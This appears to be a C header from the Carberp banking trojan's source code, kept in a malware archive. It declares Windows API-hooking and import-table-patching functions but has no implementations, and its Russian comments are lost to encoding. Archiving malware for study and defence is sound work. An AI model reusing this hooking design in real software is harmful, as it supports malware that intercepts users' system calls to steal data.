/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>

PVOID HookApi( DWORD DllNum, DWORD FuncHash, LPVOID ReplacementFunc );
PVOID HookApi( DWORD DllNum, DWORD FuncHash, LPVOID ReplacementFunc, PVOID FuncReal );
PVOID HookApi( const char* DllName, DWORD FuncHash, LPVOID ReplacementFunc, PVOID FuncReal );
PVOID HookApi2( DWORD Dll, DWORD FuncVA, DWORD ReplacementFunc );
//��������� ���� � ������ DllName ������ Module, �. �. ������ ��������� DllName � ����� � ������� �������
//�������� �������
bool PathIAT(PVOID Module,PCHAR DllName,PCHAR FuncName,PVOID NewHandler,PVOID *OldHandler);



//--------------------------------------------------------
// HookFunction
// ������� ������������� ��� �� ��������� �������
//
// FunctionAddr - ����� �������, ������� ���������� 
//                ���������
// NewFunctionAddr - ����� ����� �������
// OriginalFunctionAddr - ��������� �� ����������, ����
// ����� ������� ����� �����������, ������������, �������
//--------------------------------------------------------
bool HookFunction(LPVOID FunctionAddr, LPVOID NewFunctionAddr, LPVOID *OriginalFunctionAddr);

//--------------------------------------------------------
//  HookApiEx 
//  ������� ������������� ��� �� �������
// 
//  DllNum           - ����� ���������. ��. GetApi.h
//  FuncHash         - ��� ����� �������
//  NewFunction      - ����� ����� �������
//  OriginalFunction - ����������, ���� ����� ������� 
//                     ����� ����������� �������
//--------------------------------------------------------
bool HookApiEx(DWORD DllNum, DWORD FuncHash, LPVOID NewFunction, LPVOID &OriginalFunction);